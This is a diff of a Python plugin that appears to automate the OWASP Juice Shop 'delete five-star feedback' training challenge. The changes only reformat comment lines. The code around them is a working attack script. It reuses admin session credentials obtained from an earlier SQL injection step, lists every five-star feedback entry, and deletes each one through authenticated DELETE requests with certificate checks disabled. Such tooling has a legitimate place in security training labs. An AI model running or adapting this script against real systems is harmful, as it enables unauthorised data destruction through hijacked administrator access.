@@ -14,17 +14,19 @@
 
 import time
 from plugins import attack as a
-#---------------------------------------------------------------------------------------
+
+#--------------------------------------------------------------------------------------
 #Class: delete_fiveStar
 #Inherit: Attack
-#----------------------------------------------------------------------------------------
+#--------------------------------------------------------------------------------------
 class delete_fiveStar():
-#-----------------------------------------
+
+#--------------------------------------------------------------------------------------
 #FUNCTION: __init__ 
 #ARGUMENTS: N/A
 #RETURNS: void
 #Description: Initial class variables
-#-----------------------------------------------------------------------------------------------
+#--------------------------------------------------------------------------------------
     def __init__(self):
         # REST session
         self.juice_session = a.requests.session()
@@ -35,14 +37,14 @@ class delete_fiveStar():
         # target is all five star feedbacks.
         self.deleteStar = 5
 
-#-----------------------------------------
+#--------------------------------------------------------------------------------------
 #FUNCTION generator
 #ARGUMENTS: N/A
 #RETURNS: N/A
 #Description: This function is used to generate needed data from REST requests
 #             
 #NOTES:
-#-----------------------------------------------------------------------------------------------
+#--------------------------------------------------------------------------------------
     def generator(self):
         try:
             new_cookie, new_header = a.get_auth("admin")
@@ -50,14 +52,14 @@ class delete_fiveStar():
         except:
             print("you do not have a record of admin, please try SQL injection first")
 
-#-----------------------------------------
+#--------------------------------------------------------------------------------------
 #FUNCTION show_5StarList
 #ARGUMENTS: N/A
 #RETURNS: show_List  --> List of all five star feedbacks's id
 #Description: Send a GET request to get all five feedbacks's corresponding ID 
 #             
 #NOTES:
-#-----------------------------------------------------------------------------------------------
+#--------------------------------------------------------------------------------------
     def show_5StarList(self):
         response = self.juice_session.get(self.url,
                                           cookies=self.cookie, headers=self.header, verify=False)
@@ -70,14 +72,14 @@ class delete_fiveStar():
         print(show_List)
         return show_List
 
-#-----------------------------------------
+#--------------------------------------------------------------------------------------
 #FUNCTION show_5StarList
 #ARGUMENTS: delete_list --> List of all five star feedbacks's id
 #RETURNS: N/A
 #Description: Send a DELETE request to delete all five feedbacks by ID 
 #             
 #NOTES:
-#-----------------------------------------------------------------------------------------------
+#--------------------------------------------------------------------------------------
     def delete_allList(self, delete_list):
         for j in range(len(delete_list)):
             print(delete_list[j])
@@ -85,14 +87,14 @@ class delete_fiveStar():
                                             cookies=self.cookie, headers=self.header, verify=False)
             print(res)
 
-#-----------------------------------------------------------------------
+#--------------------------------------------------------------------------------------
 #FUNCTION run
 #ARGUMENTS: N/A
 #RETURNS: N/A
 #Description: This is the main function for plugin.
 #             
 #NOTES: None
-#-----------------------------------------------------------------------------------------------
+#--------------------------------------------------------------------------------------
     def run(self):
         print("--------------------------------------------------------------")
         print("Now let us solve the challenge five star deleting ------------")
